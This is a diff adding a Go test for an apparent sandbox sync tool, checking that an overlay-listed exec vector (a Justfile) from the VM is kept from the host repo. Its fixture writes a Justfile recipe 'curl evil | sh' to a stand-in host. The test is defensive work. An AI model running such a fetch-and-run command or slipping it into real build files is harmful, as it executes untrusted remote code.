@@ -236,3 +236,47 @@ func TestSyncGivesUp(t *testing.T) {
 		t.Errorf("err %v after %d connections", err, tr.conns)
 	}
 }
+
+// TestSyncOverlayExecVectors: a sync holds changes to the overlay's exec vectors for review (the
+// host reads the overlay itself), and an overlay config it cannot read stops the sync.
+func TestSyncOverlayExecVectors(t *testing.T) {
+	repo, vmdir, state, home := t.TempDir(), t.TempDir(), t.TempDir(), t.TempDir()
+	if out, err := exec.Command("git", "init", "-q", repo).CombinedOutput(); err != nil {
+		t.Fatal(string(out))
+	}
+	ov := filepath.Join(home, "overlay")
+	os.MkdirAll(ov, 0o755)
+	os.WriteFile(filepath.Join(ov, "config.yaml"), []byte("exec_vectors:\n  - Justfile\n"), 0o644)
+	getenv := func(k string) string {
+		if k == "SANDBOX_OVERLAY" {
+			return ov
+		}
+		return ""
+	}
+	tr := &agentTransport{vmdir: vmdir}
+	a := &app{env: Env{Transport: tr, StateDir: state, Home: home, Getenv: getenv, Stdout: io.Discard, Stderr: io.Discard}, ctx: context.Background()}
+	if _, _, err := a.syncRepo(driver.SSHEndpoint{}, repo); err != nil {
+		t.Fatal(err)
+	}
+	os.WriteFile(filepath.Join(vmdir, "Justfile"), []byte("x:\n\tcurl evil | sh\n"), 0o644)
+	os.WriteFile(filepath.Join(vmdir, "notes.txt"), []byte("fine\n"), 0o644)
+	if _, _, err := a.syncRepo(driver.SSHEndpoint{}, repo); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(filepath.Join(repo, "Justfile")); err == nil {
+		t.Error("the overlay's exec vector reached the host")
+	}
+	if _, err := os.Stat(filepath.Join(repo, "notes.txt")); err != nil {
+		t.Error("an ordinary file did not")
+	}
+	if runtime.GOOS != "windows" && os.Getuid() != 0 {
+		os.Chmod(filepath.Join(ov, "config.yaml"), 0)
+		defer os.Chmod(filepath.Join(ov, "config.yaml"), 0o644)
+		old := syncRetryBase
+		syncRetryBase = time.Millisecond
+		defer func() { syncRetryBase = old }()
+		if _, _, err := a.syncRepo(driver.SSHEndpoint{}, repo); err == nil || !strings.Contains(err.Error(), "exec_vectors") {
+			t.Errorf("unreadable overlay config: %v", err)
+		}
+	}
+}
